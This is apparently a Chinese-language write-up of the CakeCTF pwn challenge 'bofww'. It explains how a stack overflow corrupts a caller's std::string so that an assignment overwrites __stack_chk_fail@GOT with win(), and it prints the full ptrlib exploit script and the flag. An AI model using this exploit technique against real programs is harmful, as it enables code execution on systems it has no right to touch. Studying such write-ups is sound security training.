# bofww

## 题目简述

程序在 `input_person` 中把姓名读入固定的 `char _name[0x100]`，却直接使用没有宽度限制的 `std::cin >> _name`：

```cpp
void input_person(int& age, std::string& name) {
    int _age;
    char _name[0x100];
    std::cin >> _name;
    std::cin >> _age;
    name = _name;
    age = _age;
}
```

二进制为 non-PIE，使用 Partial RELRO/Lazy Binding，`__stack_chk_fail@GOT` 可写，源码还保留了执行 `system("/bin/sh")` 的 `win()`。这并不是普通的“覆盖返回地址后 ret2win”：官方解法先用跨栈帧溢出破坏调用者的 `std::string name` 对象，再借 `name = _name` 获得一次定向写，最后利用已损坏的栈 canary 自动触发被改写的 `__stack_chk_fail`。

## 解题过程

### 把 `std::string` 变成任意写目标

在该 libstdc++ ABI 下，长字符串状态的 `std::string` 对象包含数据指针、当前长度和容量。`name` 位于调用者 `main` 的栈帧；对 `_name` 的超长输入不仅破坏当前函数的 canary，还会继续覆盖这个对象。

官方 payload 的布局为：

```text
_name 开头             p64(win)
中间填充               0x128 个 NUL
name.data pointer       __stack_chk_fail@GOT
name.length             0x1000
name.capacity           0x1000
```

把长度与容量设为较大的非短字符串状态后，`name = _name` 会把 `_name` 所指的 C 字符串复制到伪造的 `name.data`。`p64(win)` 的高字节本身含 NUL，所以 C 字符串恰好以 `win` 的小端地址字节开头并很快结束；赋值操作因此把 `win` 地址写入 `__stack_chk_fail@GOT`，而不是把整段溢出数据复制过去。

### 借 canary 失败完成控制流劫持

姓名溢出已经破坏 canary。年龄输入只需提供一个合法整数，使函数继续执行 `name = _name` 和 `age = _age`。函数返回前的栈保护检查失败，正常情况下会调用 `__stack_chk_fail`；但其 GOT 项此时已经指向 `win`，于是程序转而执行 `/bin/sh`。

与仓库 `solution/solve.py` 一致的利用核心为：

```python
from ptrlib import ELF, Socket, p64

elf = ELF("./bofww")
sock = Socket(HOST, PORT)

payload  = p64(elf.symbol("_Z3winv"))
payload += b"\x00" * 0x128
payload += p64(elf.got("__stack_chk_fail"))
payload += p64(0x1000)
payload += p64(0x1000)

sock.sendlineafter("? ", payload)
sock.sendlineafter("? ", 0xdead)
sock.sh()
```

进入 shell 后读取 flag：

```text
CakeCTF{n0w_try_w1th0ut_w1n_func710n:)}
```

## 方法总结

- 核心技巧：跨栈帧覆盖调用者的 `std::string` 元数据，把随后一次正常的字符串赋值转成 GOT 定向写，再让栈保护失败调用被劫持的入口。
- 识别信号：无界 `operator>> char*` 之后紧跟 `std::string = char*`；调用者字符串对象可被覆盖；二进制 non-PIE 且 `__stack_chk_fail@GOT` 可写；同时存在 `win`。
- 复用要点：不要只盯返回地址。C++ 对象的指针、长度和容量一旦可控，后续看似安全的赋值或析构也可能成为读写原语。payload 中的内嵌 NUL 同时负责终止源 C 字符串，并让目标地址只需写入有效低字节。
